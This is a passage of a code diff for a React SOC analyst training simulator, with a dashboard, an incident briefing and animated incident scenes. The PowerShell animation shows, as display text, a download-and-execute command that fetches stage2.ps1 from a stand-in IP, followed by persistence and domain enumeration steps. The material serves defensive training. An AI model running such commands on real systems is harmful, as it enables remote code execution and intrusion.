+              <div key={l} style={{display:"flex",gap:8,alignItems:"center",padding:"7px 9px",borderRadius:6,marginBottom:2,background:on?"var(--acl)":"transparent",border:on?"1px solid var(--acb)":"1px solid transparent",cursor:"pointer"}}>
+                <span style={{fontSize:13}}>{ic}</span>
+                <span style={{fontSize:12,color:on?"var(--ac)":"var(--tx3)",fontWeight:on?600:400}}>{l}</span>
+              </div>
+            ))}
+          </div>
+          <div style={{padding:"14px",borderTop:"1px solid var(--bd)",marginTop:"auto"}}>
+            <div style={{fontSize:8.5,fontWeight:700,color:"var(--tx4)",letterSpacing:"0.14em",fontFamily:"var(--mo)",textTransform:"uppercase",marginBottom:8}}>Analyst XP</div>
+            <div style={{fontSize:18,fontWeight:700,color:"var(--ac)",fontFamily:"var(--mo)",marginBottom:4}}>{prog.xp} XP</div>
+            <div style={{fontSize:10,color:"var(--tx4)",marginBottom:6}}>Level {prog.level} — {prog.level<5?"Junior Analyst":prog.level<10?"SOC Analyst I":prog.level<15?"SOC Analyst II":"Threat Hunter"}</div>
+            <div style={{height:4,background:"var(--bg4)",borderRadius:2,overflow:"hidden"}}>
+              <div style={{height:"100%",width:Math.min(99,((prog.xp%500)/500)*100)+"%",background:"var(--ac)",borderRadius:2}}/>
+            </div>
+          </div>
+        </div>
+
+        {/* MAIN */}
+        <div style={{flex:1,overflow:"auto",padding:"20px"}}>
+          {/* shift greeting */}
+          <div style={{marginBottom:20}}>
+            <div style={{fontSize:11,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:3}}>Good morning, {analyst.name.split(" ")[0]} — Shift started 08:00 UTC</div>
+            <div style={{fontSize:22,fontWeight:700,color:"var(--tx)"}}>SOC Operations Dashboard</div>
+          </div>
+
+          {/* severity counters */}
+          <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:10,marginBottom:20}}>
+            {[["CRITICAL","1","#dc2626","rgba(220,38,38,0.12)"],["HIGH","3","#ea580c","rgba(234,88,12,0.1)"],["MEDIUM","7","#ca8a04","rgba(202,138,4,0.1)"],["LOW","12","#16a34a","rgba(22,163,74,0.08)"]].map(([l,n,c,bg])=>(
+              <div key={l} style={{background:bg,border:"1px solid "+c+"30",borderRadius:10,padding:"14px 16px",textAlign:"center",animation:l==="CRITICAL"?"glow 3s ease-in-out infinite":"none"}}>
+                <div style={{fontSize:28,fontWeight:800,color:c,fontFamily:"var(--mo)",lineHeight:1,marginBottom:4}}>{n}</div>
+                <div style={{fontSize:9,color:c,fontFamily:"var(--mo)",fontWeight:700,letterSpacing:"0.12em"}}>{l}</div>
+              </div>
+            ))}
+          </div>
+
+          {/* ACTIVE INCIDENT */}
+          <div style={{marginBottom:14}}>
+            <div style={{fontSize:10,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:8}}>My Cases — Assigned to Me</div>
+            {/* My Cases — only assigned ones */}
+            {assigned.includes("INC-2026-0441") ? (
+              <div style={{background:"var(--bg2)",border:"1px solid rgba(220,38,38,0.4)",borderRadius:10,padding:"16px 18px",cursor:"pointer",boxShadow:"0 0 20px rgba(220,38,38,0.1)"}} onClick={()=>onOpen("INC-2026-0441")}>
+                <div style={{display:"flex",alignItems:"flex-start",justifyContent:"space-between",marginBottom:10}}>
+                  <div>
+                    <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:3}}>{inc.id} · {inc.created}</div>
+                    <div style={{fontSize:15,fontWeight:700,color:"var(--tx)",lineHeight:1.3}}>{inc.title}</div>
+                  </div>
+                  <div style={{display:"flex",gap:6,flexDirection:"column",alignItems:"flex-end"}}>
+                    <SevBadge s={inc.severity}/>
+                    <Badge color="amber">P1 · ASSIGNED</Badge>
+                  </div>
+                </div>
+                <div style={{fontSize:12.5,color:"var(--tx3)",lineHeight:1.65,marginBottom:10}}>{inc.summary.slice(0,160)}...</div>
+                <div style={{display:"flex",gap:6,flexWrap:"wrap",marginBottom:12}}>
+                  {inc.tags.map(t=><span key={t} className="tag">{t}</span>)}
+                </div>
+                <div style={{display:"flex",gap:10,alignItems:"center"}}>
+                  <div style={{flex:1,height:3,background:"var(--bg4)",borderRadius:2}}/>
+                  <span style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>0/6 steps</span>
+                  <button onClick={(e)=>{e.stopPropagation();onOpen("INC-2026-0441");}} style={{background:"var(--ac)",color:"#fff",padding:"7px 16px",borderRadius:7,fontSize:12,fontWeight:700,border:"none",cursor:"pointer"}}>
+                    Open Ticket →
+                  </button>
+                </div>
+              </div>
+            ) : (
+              <div style={{background:"var(--bg3)",border:"1px dashed var(--bd)",borderRadius:10,padding:"24px",textAlign:"center",color:"var(--tx4)",fontSize:13}}>
+                No cases assigned yet — assign from the queue below
+              </div>
+            )}
+          </div>
+
+          {/* alert queue — unassigned */}
+          <div>
+            <div style={{fontSize:10,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:8}}>Alert Queue — Unassigned ({assigned.includes("INC-2026-0441")?3:4} open)</div>
+            {/* Real incident — INC-2026-0441 — only show if not yet assigned */}
+            {!assigned.includes("INC-2026-0441")&&(
+              <div style={{background:"var(--bg2)",border:"1px solid rgba(220,38,38,0.35)",borderRadius:10,padding:"14px 16px",marginBottom:8,animation:"glow 3s ease-in-out infinite"}}>
+                <div style={{display:"flex",alignItems:"flex-start",gap:10,marginBottom:8}}>
+                  <Dot color="#dc2626" pulse/>
+                  <div style={{flex:1}}>
+                    <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:2}}>{inc.id} · {inc.created} · {inc.host}</div>
+                    <div style={{fontSize:13.5,fontWeight:700,color:"var(--tx)",lineHeight:1.3,marginBottom:4}}>{inc.title}</div>
+                    <div style={{fontSize:12,color:"var(--tx3)",lineHeight:1.6,marginBottom:7}}>{inc.summary.slice(0,130)}...</div>
+                    <div style={{display:"flex",gap:5,flexWrap:"wrap"}}>{inc.tags.map(t=><span key={t} className="tag">{t}</span>)}</div>
+                  </div>
+                  <div style={{display:"flex",flexDirection:"column",gap:5,alignItems:"flex-end",flexShrink:0}}>
+                    <SevBadge s="Critical"/>
+                    <Badge color="red">UNASSIGNED</Badge>
+                  </div>
+                </div>
+                <div style={{display:"flex",gap:8,justifyContent:"flex-end"}}>
+                  <button style={{background:"var(--bg3)",border:"1px solid var(--bd)",color:"var(--tx3)",padding:"6px 12px",borderRadius:6,fontSize:11,cursor:"pointer"}}>View Details</button>
+                  <button onClick={()=>onAssign("INC-2026-0441")} style={{background:"var(--err)",color:"#fff",padding:"6px 16px",borderRadius:6,fontSize:11,fontWeight:700,border:"none",cursor:"pointer"}}>
+                    ＋ Assign to Me
+                  </button>
+                </div>
+              </div>
+            )}
+            {/* Other placeholder incidents */}
+            {[
+              {id:"INC-2026-0442",sev:"High",   title:"Suspicious PowerShell on Finance DC",host:"DC-CORP-FIN-01",time:tsNow(2)},
+              {id:"INC-2026-0443",sev:"Intermediate",  title:"Impossible Travel — M365 Login",    host:"Azure AD",      time:tsNow(4)},
+              {id:"INC-2026-0444",sev:"Intermediate",  title:"DNS Tunneling — HR Workstation",    host:"WS-CORP-HR-012",time:tsNow(7)},
+            ].map(item=>(
+              <div key={item.id} style={{display:"flex",gap:12,alignItems:"center",padding:"10px 14px",background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,marginBottom:6}}>
+                <Dot color={item.sev==="High"?"#ea580c":"#ca8a04"} pulse={item.sev==="High"}/>
+                <div style={{flex:1}}>
+                  <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:2}}>{item.id} · {item.host}</div>
+                  <div style={{fontSize:12.5,color:"var(--tx2)"}}>{item.title}</div>
+                </div>
+                <div style={{display:"flex",gap:7,alignItems:"center"}}>
+                  <SevBadge s={item.sev}/>
+                  <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{item.time.slice(11,16)}</span>
+                  <button style={{fontSize:10,color:"var(--tx4)",background:"var(--bg3)",border:"1px solid var(--bd)",padding:"4px 10px",borderRadius:4,cursor:"pointer"}}>Assign</button>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// SOC CONSOLE — main investigation view
+// ─────────────────────────────────────────────────────────────────────────────
+
+
+function IncidentBriefing({inc, onStart}) {
+  const b = inc.briefing;
+  if(!b){onStart();return null;}
+  return(
+    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.92)",zIndex:500,display:"flex",alignItems:"center",justifyContent:"center",padding:16,overflowY:"auto"}}>
+      <div style={{background:"#fff",borderRadius:16,padding:0,maxWidth:520,width:"100%",overflow:"hidden",animation:"fadeUp 0.4s ease"}}>
+        <div style={{background:"#dc2626",padding:"14px 20px",display:"flex",alignItems:"center",gap:10}}>
+          <span style={{fontSize:20}}>🚨</span>
+          <div>
+            <div style={{fontSize:9,fontWeight:700,color:"rgba(255,255,255,0.7)",letterSpacing:"0.15em",fontFamily:"monospace",textTransform:"uppercase",marginBottom:2}}>Incident Briefing — {inc.id}</div>
+            <div style={{fontSize:15,fontWeight:700,color:"#fff"}}>{inc.title}</div>
+          </div>
+        </div>
+        <div style={{padding:"18px 20px"}}>
+          <div style={{fontSize:10.5,fontWeight:600,color:"#6b7280",fontFamily:"monospace",marginBottom:10}}>{b.time}</div>
+          {b.paragraphs.map((p,i)=><p key={i} style={{fontSize:13.5,color:"#374151",lineHeight:1.8,marginBottom:10}}>{p}</p>)}
+          <div style={{background:"#fef2f2",border:"1px solid #fca5a5",borderRadius:9,padding:"11px 13px",marginBottom:12}}>
+            <div style={{fontSize:9,fontWeight:700,color:"#dc2626",letterSpacing:"0.1em",fontFamily:"monospace",marginBottom:7,textTransform:"uppercase"}}>What is at risk</div>
+            {b.atRisk.map((r,i)=>(
+              <div key={i} style={{display:"flex",gap:7,marginBottom:4}}>
+                <span style={{color:"#dc2626",fontSize:11,flexShrink:0}}>⚠</span>
+                <span style={{fontSize:12.5,color:"#7f1d1d",lineHeight:1.5}}>{r}</span>
+              </div>
+            ))}
+          </div>
+          <div style={{background:"#eff6ff",border:"1px solid #bfdbfe",borderRadius:9,padding:"11px 13px",marginBottom:16}}>
+            <div style={{fontSize:9,fontWeight:700,color:"#1d4ed8",letterSpacing:"0.1em",fontFamily:"monospace",marginBottom:5,textTransform:"uppercase"}}>🎯 Your Mission</div>
+            <div style={{fontSize:13,color:"#1e3a5f",lineHeight:1.7,fontWeight:500}}>{b.mission}</div>
+          </div>
+          <button onClick={onStart} style={{width:"100%",background:"#dc2626",color:"#fff",padding:"14px",borderRadius:10,fontSize:15,fontWeight:700,border:"none",cursor:"pointer",boxShadow:"0 4px 14px rgba(220,38,38,0.35)"}}>
+            Begin Investigation →
+          </button>
+          <div style={{textAlign:"center",marginTop:8,fontSize:10.5,color:"#9ca3af"}}>🔒 TRAINING SIMULATION ONLY — All incidents, users, companies, IP addresses, and data are completely fictional and created for educational purposes. No real organisations or individuals are represented. No real security tools or data sources are used.</div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// INCIDENT ANIMATIONS — Cinematic, premium, incident-specific
+// Pure CSS/SVG — no libraries needed
+// ════════════════════════════════════════════════════════════════
+
+function IncidentAnimation({incId}) {
+  const type = {
+    "INC-2026-0441":"phishing","INC-2026-0502":"powershell",
+    "INC-2026-0521":"travel","INC-2026-0544":"portscan",
+    "INC-2026-0561":"usb","INC-2026-0578":"dns",
+    "INC-2026-0591":"pentest","INC-2026-0612":"bec",
+    "INC-2026-0634":"cloud","INC-2026-0651":"bruteforce",
+  }[incId]||"phishing";
+
+  const css = `
+    @keyframes ia_float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+    @keyframes ia_float2{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-7px) rotate(2deg)}}
+    @keyframes ia_pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.95)}}
+    @keyframes ia_ping{0%{transform:scale(1);opacity:0.8}100%{transform:scale(3);opacity:0}}
+    @keyframes ia_ping2{0%{transform:scale(1);opacity:0.6}100%{transform:scale(2.5);opacity:0}}
+    @keyframes ia_glow{0%,100%{filter:drop-shadow(0 0 6px rgba(220,38,38,0.5)) drop-shadow(0 0 20px rgba(220,38,38,0.2))}50%{filter:drop-shadow(0 0 12px rgba(220,38,38,0.9)) drop-shadow(0 0 40px rgba(220,38,38,0.4))}}
+    @keyframes ia_glowblue{0%,100%{filter:drop-shadow(0 0 6px rgba(59,130,246,0.5))}50%{filter:drop-shadow(0 0 16px rgba(59,130,246,1))}}
+    @keyframes ia_beam{0%{opacity:0;height:0}40%{opacity:1;height:100%}70%{opacity:0.8}100%{opacity:0;height:100%}}
+    @keyframes ia_scan{0%{transform:translateY(-5px);opacity:0}20%{opacity:1}80%{opacity:0.8}100%{transform:translateY(90px);opacity:0}}
+    @keyframes ia_fly{0%{transform:translate(-80px,30px) rotate(-15deg) scale(0.5);opacity:0}50%{opacity:1;transform:translate(0,0) rotate(3deg) scale(1)}85%{opacity:1}100%{transform:translate(10px,-8px) rotate(5deg) scale(0.95);opacity:0.9}}
+    @keyframes ia_type{0%{width:0}100%{width:100%}}
+    @keyframes ia_blink{0%,100%{opacity:1}50%{opacity:0}}
+    @keyframes ia_stream{0%{transform:translateY(-30px);opacity:0}40%{opacity:1}100%{transform:translateY(100px);opacity:0}}
+    @keyframes ia_spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    @keyframes ia_spinrev{0%{transform:rotate(0deg)}100%{transform:rotate(-360deg)}}
+    @keyframes ia_orbit{0%{transform:rotate(0deg) translateX(44px) rotate(0deg)}100%{transform:rotate(360deg) translateX(44px) rotate(-360deg)}}
+    @keyframes ia_shake{0%,100%{transform:translateX(0)}15%,45%,75%{transform:translateX(-4px)}30%,60%,90%{transform:translateX(4px)}}
+    @keyframes ia_insert{0%{transform:translateX(-60px);opacity:0}60%{transform:translateX(4px);opacity:1}80%,100%{transform:translateX(0);opacity:1}}
+    @keyframes ia_dataleakline{0%{transform:translateY(0);opacity:0.9}100%{transform:translateY(50px);opacity:0}}
+    @keyframes ia_particle{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--px),var(--py));opacity:0}}
+    @keyframes ia_reveal{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:translateY(0)}}
+    @keyframes ia_radar{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    @keyframes ia_zap{0%,100%{opacity:0.2}30%,70%{opacity:1}}
+  `;
+
+  /* ── PHISHING → C2 ─────────────────────────────────────── */
+  if(type==="phishing") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1220 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      {/* Deep space background glow */}
+      <div style={{position:"absolute",width:200,height:200,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(220,38,38,0.08) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)",pointerEvents:"none"}}/>
+
+      {/* Laptop — 3D perspective */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%) perspective(400px) rotateX(8deg)",
+        width:150,transformOrigin:"bottom center"}}>
+        {/* Screen */}
+        <div style={{background:"#0a0d14",border:"2.5px solid #1e2533",borderRadius:"6px 6px 0 0",
+          height:80,position:"relative",overflow:"hidden",
+          boxShadow:"0 -4px 30px rgba(220,38,38,0.15),inset 0 0 20px rgba(0,0,0,0.5)"}}>
+          {/* Screen content */}
+          <div style={{position:"absolute",inset:0,padding:8}}>
+            <div style={{display:"flex",gap:3,marginBottom:5}}>
+              {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
+                <div key={i} style={{width:7,height:7,borderRadius:"50%",background:c}}/>
+              ))}
+            </div>
+            {/* Fake SIEM alert */}
+            <div style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.4)",
+              borderRadius:3,padding:"3px 5px",marginBottom:4}}>
+              <div style={{fontSize:6.5,color:"#f87171",fontFamily:"monospace",fontWeight:700}}>
+                ⚠ CRITICAL — C2_BEACON_DETECTED
+              </div>
+              <div style={{fontSize:5.5,color:"#6b7280",fontFamily:"monospace",marginTop:1}}>
+                WS-CORP-FIN-044 → 203.0.113.47:443
+              </div>
+            </div>
+            <div style={{fontSize:6,color:"#ef4444",fontFamily:"monospace",
+              animation:"ia_blink 1.2s step-end infinite",fontWeight:700}}>
+              ▶ MACRO PAYLOAD EXECUTING...
+            </div>
+          </div>
+          {/* Scanline */}
+          <div style={{position:"absolute",left:0,right:0,height:2,
+            background:"linear-gradient(90deg,transparent,rgba(220,38,38,0.3),transparent)",
+            animation:"ia_scan 3s linear infinite"}}/>
+        </div>
+        {/* Base */}
+        <div style={{background:"#1e2533",height:6,borderRadius:"0 0 4px 4px",
+          boxShadow:"0 4px 16px rgba(0,0,0,0.6)"}}/>
+        <div style={{background:"#111318",height:3,borderRadius:2,margin:"0 10px",
+          boxShadow:"0 2px 8px rgba(0,0,0,0.4)"}}/>
+      </div>
+
+      {/* Flying evil email */}
+      <div style={{position:"absolute",top:18,right:"18%",
+        animation:"ia_fly 4s ease-in-out infinite"}}>
+        <svg width="44" height="34" viewBox="0 0 44 34"
+          style={{filter:"drop-shadow(0 0 10px rgba(220,38,38,0.7))"}}>
+          <defs>
+            <linearGradient id="emailgrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stopColor="#2d0a0a"/>
+              <stop offset="100%" stopColor="#1a0505"/>
+            </linearGradient>
+          </defs>
+          <rect x="1" y="1" width="42" height="32" rx="4" fill="url(#emailgrad)"
+            stroke="#dc2626" strokeWidth="1.5"/>
+          <polyline points="1,1 22,18 43,1" fill="none" stroke="#ef4444" strokeWidth="1.5"/>
+          <text x="22" y="29" textAnchor="middle" fill="#ef4444" fontSize="12"
+            fontFamily="monospace">☠</text>
+        </svg>
+        {/* Ping rings */}
+        {[0,1].map(i=>(
+          <div key={i} style={{position:"absolute",width:20,height:20,borderRadius:"50%",
+            border:"1.5px solid rgba(220,38,38,0.5)",top:7,left:12,
+            animation:`ia_ping ${1.5+i*0.4}s ${i*0.5}s ease-out infinite`}}/>
+        ))}
+      </div>
+
+      {/* C2 beacon beam */}
+      <div style={{position:"absolute",bottom:70,left:"calc(50% + 30px)",
+        width:1.5,background:"linear-gradient(to top,transparent,rgba(220,38,38,0.8),rgba(220,38,38,0.3))",
+        animation:"ia_beam 3s 0.5s ease-in-out infinite",height:50,
+        boxShadow:"0 0 8px rgba(220,38,38,0.4)",transformOrigin:"bottom"}}/>
+
+      {/* Russia server */}
+      <div style={{position:"absolute",top:14,right:"8%",textAlign:"center",
+        animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:26,animation:"ia_glow 2s ease-in-out infinite"}}>🖥</div>
+        <div style={{fontSize:9,fontWeight:800,color:"#ef4444",fontFamily:"monospace",
+          letterSpacing:"0.1em",animation:"ia_blink 1s 0.3s infinite"}}>RU</div>
+        {[0,1,2].map(i=>(
+          <div key={i} style={{position:"absolute",width:36,height:36,borderRadius:"50%",
+            border:"1px solid rgba(220,38,38,0.3)",top:-5,left:-5,
+            animation:`ia_ping ${2}s ${i*0.6}s ease-out infinite`}}/>
+        ))}
+      </div>
+
+      {/* Particle data stream */}
+      {[...Array(6)].map((_,i)=>(
+        <div key={i} style={{position:"absolute",
+          left:`${45+i*3}%`,bottom:`${50+i*4}%`,
+          width:2,height:2,borderRadius:"50%",background:"#dc2626",
+          animation:`ia_dataleakline 1.5s ${i*0.25}s linear infinite`,
+          opacity:0.7}}/>
+      ))}
+
+      {/* Label */}
+      <div style={{position:"absolute",bottom:4,left:"50%",transform:"translateX(-50%)",
+        fontSize:8,color:"rgba(220,38,38,0.7)",fontFamily:"monospace",
+        letterSpacing:"0.15em",fontWeight:700,whiteSpace:"nowrap"}}>
+        ACTIVE C2 BEACON · SIMULATED
+      </div>
+    </div>
+  );
+
+  /* ── POWERSHELL ─────────────────────────────────────────── */
+  if(type==="powershell") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1018 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",width:240,height:180,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(139,92,246,0.07) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)"}}/>
+
+      {/* Terminal window — 3D */}
+      <div style={{position:"absolute",top:16,left:"50%",transform:"translateX(-50%) perspective(600px) rotateX(3deg)",
+        width:270,animation:"ia_float2 5s ease-in-out infinite"}}>
+        <div style={{background:"#0d0f1a",border:"1.5px solid #3730a3",borderRadius:8,
+          overflow:"hidden",boxShadow:"0 8px 40px rgba(139,92,246,0.25),0 0 0 1px rgba(139,92,246,0.1)"}}>
+          {/* Title bar */}
+          <div style={{background:"#1e1b4b",padding:"5px 8px",display:"flex",
+            alignItems:"center",gap:5,borderBottom:"1px solid #312e81"}}>
+            {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
+              <div key={i} style={{width:8,height:8,borderRadius:"50%",background:c}}/>
+            ))}
+            <span style={{fontSize:8,color:"#818cf8",fontFamily:"monospace",marginLeft:4,
+              fontWeight:700}}>Windows PowerShell — ELEVATED</span>
+          </div>
+          {/* Terminal body */}
+          <div style={{padding:"8px 10px",minHeight:100}}>
+            {[
+              {t:0,   color:"#4ade80", text:"PS C:\Users\admin> whoami"},
+              {t:0,   color:"#e8ecf4", text:"CORP\\svc_account (Domain Admin)"},
+              {t:0.4, color:"#4ade80", text:"PS C:\> Invoke-Expression (New-Object Net.WebClient).DownloadString("},
+              {t:0.4, color:"#fbbf24", text:'  "http://203.0.113.47/stage2.ps1")'},
+              {t:0.8, color:"#f87171", text:"[!] Downloading payload..."},
+              {t:1.2, color:"#f87171", text:"[!] Establishing persistence: HKCU\\Run"},
+              {t:1.6, color:"#4ade80", text:"PS C:\> net user /domain"},
+              {t:1.6, color:"#e8ecf4", text:"Enumerating 847 domain accounts..."},
+            ].map((line,i)=>(
+              <div key={i} style={{fontSize:8,color:line.color,fontFamily:"monospace",
+                lineHeight:1.7,overflow:"hidden",
+                animation:`ia_reveal 0.3s ${line.t}s both`}}>
+                {line.text}
+              </div>
+            ))}
+            <span style={{display:"inline-block",width:7,height:13,
+              background:"#4ade80",verticalAlign:"middle",
+              animation:"ia_blink 0.8s step-end infinite"}}/>
+          </div>
+        </div>
+        {/* Scanline overlay */}
+        <div style={{position:"absolute",inset:0,borderRadius:8,overflow:"hidden",
+          pointerEvents:"none"}}>
+          <div style={{position:"absolute",width:"100%",height:3,
+            background:"linear-gradient(90deg,transparent,rgba(139,92,246,0.15),transparent)",
+            animation:"ia_scan 2.5s linear infinite"}}/>
+        </div>
+      </div>
+
+      {/* Alert badges */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        display:"flex",gap:6}}>
+        {["LSASS DUMP","PERSISTENCE","LATERAL MOVE"].map(label=>(
+          <div key={label} style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.4)",
+            borderRadius:4,padding:"2px 6px",fontSize:6.5,color:"#f87171",
+            fontFamily:"monospace",fontWeight:700,animation:"ia_pulse 2s ease-in-out infinite"}}>
+            {label}
           </div>
         ))}
-        {selectedFile && !quarantined.includes(selectedFile) && (() => {
-          const f = files.find(x=>x.name===selectedFile);
-          return (
-            <div className="f-actions open">
-              <div className="fa-title">{f.name}</div>
-              {f.info ? Object.entries(f.info).map(([k,v]) => (
-                <div key={k} className="fa-row"><span className="far-k">{k}</span><span className={`far-v${k==='Verdict'?' bad':''}`}>{v}</span></div>
-              )) : <div style={{fontSize:11,color:'rgba(255,255,255,0.25)'}}>No threat indicators.</div>}
-              {f.malicious && (
-                <div className="g-act-row">
-                  <button className="g-btn bad" onClick={()=>doQuarantine(f.name, true)}>🔒 Quarantine</button>
-                  <button className="g-btn neutral" onClick={()=>setSelectedFile(null)}>Cancel</button>
-                </div>
-              )}
-            </div>
-          );
-        })()}
       </div>
-    );
-  };
+    </div>
+  );
 
-  const doQuarantine = (name, isMal) => {
-    flash(isMal?'g':'r');
-    const newQ = [...quarantined, name];
-    setQuarantined(newQ);
-    setSelectedFile(null);
-    const malFiles = scene.data.files.filter(f=>f.malicious).map(f=>f.name);
-    const allDone = malFiles.every(f=>newQ.includes(f));
-    if(allDone && !decisionMade) {
-      gainXP(Math.floor(scene.xp/2));
-    }
-  };
+  /* ── IMPOSSIBLE TRAVEL ──────────────────────────────────── */
+  if(type==="travel") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060a14 0%,#0a1020 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
 
-  // ── REPORT ─────────────────────────────────────────────────────────
-  const renderReport = () => {
-    const summary = scene.data.summary;
-    return (
-      <div className="rep-wrap">
-        <div className="rep-sec">
-          <div className="rep-sec-title">Incident Summary — Auto-populated</div>
-          {Object.entries(summary).map(([k,v]) => (
-            <div key={k} className="rep-row">
-              <span className="rk">{k}</span>
-              <span className={`rv${k==='Classification'||k==='Severity'||k==='Malware'||k==='C2'?' bad':k==='Status'?' ok':k==='Attack type'?' warn':''}`}>{v}</span>
+      {/* Globe */}
+      <div style={{position:"absolute",top:15,left:"50%",transform:"translateX(-50%)",
+        width:110,height:110,borderRadius:"50%",animation:"ia_float2 5s ease-in-out infinite",
+        boxShadow:"0 0 40px rgba(59,130,246,0.2),0 0 0 1px rgba(59,130,246,0.15)"}}>
+        <div style={{width:"100%",height:"100%",borderRadius:"50%",overflow:"hidden",
+          background:"radial-gradient(circle at 35% 30%,#0c2461,#050d1f)"}}>
+          {/* Latitude lines */}
+          {[20,40,60,80].map(y=>(
+            <div key={y} style={{position:"absolute",top:`${y}%`,left:0,right:0,
+              height:1,background:"rgba(59,130,246,0.15)"}}/>
+          ))}
+          {/* Longitude lines */}
+          {[20,35,50,65,80].map(x=>(
+            <div key={x} style={{position:"absolute",left:`${x}%`,top:0,bottom:0,
+              width:1,background:"rgba(59,130,246,0.12)"}}/>
+          ))}
+          {/* Continents */}
+          <div style={{position:"absolute",top:"15%",left:"8%",
+            width:"28%",height:"35%",background:"rgba(34,197,94,0.25)",
+            borderRadius:"40% 55% 45% 35%",filter:"blur(1px)"}}/>
+          <div style={{position:"absolute",top:"20%",left:"42%",
+            width:"22%",height:"30%",background:"rgba(34,197,94,0.22)",
+            borderRadius:"35% 50% 40% 60%",filter:"blur(1px)"}}/>
+          <div style={{position:"absolute",top:"40%",left:"60%",
+            width:"25%",height:"28%",background:"rgba(34,197,94,0.2)",
+            borderRadius:"45% 35% 55% 40%",filter:"blur(1px)"}}/>
+        </div>
+        {/* Globe ring */}
+        <div style={{position:"absolute",inset:-3,borderRadius:"50%",
+          border:"1.5px solid rgba(59,130,246,0.3)",
+          boxShadow:"0 0 20px rgba(59,130,246,0.15)"}}/>
+      </div>
+
+      {/* Pin 1 — Mumbai (green = expected) */}
+      <div style={{position:"absolute",top:20,left:"22%",
+        animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:20,filter:"drop-shadow(0 0 8px rgba(34,197,94,0.8))"}}>📍</div>
+        <div style={{background:"rgba(34,197,94,0.15)",border:"1px solid rgba(34,197,94,0.5)",
+          borderRadius:4,padding:"2px 5px",marginTop:1}}>
+          <div style={{fontSize:6.5,color:"#4ade80",fontFamily:"monospace",fontWeight:700}}>Mumbai</div>
+          <div style={{fontSize:6,color:"#6b7280",fontFamily:"monospace"}}>09:00 IST</div>
+        </div>
+      </div>
+
+      {/* Pin 2 — London (red = impossible) */}
+      <div style={{position:"absolute",top:15,right:"18%",
+        animation:"ia_float 3s 1.5s ease-in-out infinite"}}>
+        <div style={{fontSize:20,filter:"drop-shadow(0 0 8px rgba(220,38,38,0.8))"}}>📍</div>
+        <div style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.5)",
+          borderRadius:4,padding:"2px 5px",marginTop:1}}>
+          <div style={{fontSize:6.5,color:"#f87171",fontFamily:"monospace",fontWeight:700}}>London</div>
+          <div style={{fontSize:6,color:"#6b7280",fontFamily:"monospace"}}>09:05 UTC</div>
+        </div>
+      </div>
+
+      {/* Connection arc */}
+      <svg style={{position:"absolute",top:20,left:"27%",width:"46%",height:50}} viewBox="0 0 100 40">
+        <path d="M0 35 Q50 -10 100 30" fill="none" stroke="url(#arcgrad)"
+          strokeWidth="1.5" strokeDasharray="4 2">
+          <animate attributeName="stroke-dashoffset" from="60" to="0"
+            dur="2s" repeatCount="indefinite"/>
+        </path>
+        <defs>
+          <linearGradient id="arcgrad" x1="0" y1="0" x2="1" y2="0">
+            <stop offset="0%" stopColor="#4ade80"/>
+            <stop offset="100%" stopColor="#f87171"/>
+          </linearGradient>
+        </defs>
+      </svg>
+
+      {/* Warning banner */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.5)",
+        borderRadius:6,padding:"4px 12px",whiteSpace:"nowrap",
+        animation:"ia_pulse 1.5s ease-in-out infinite"}}>
+        <div style={{fontSize:8,color:"#f87171",fontFamily:"monospace",fontWeight:700,
+          letterSpacing:"0.12em",textAlign:"center"}}>
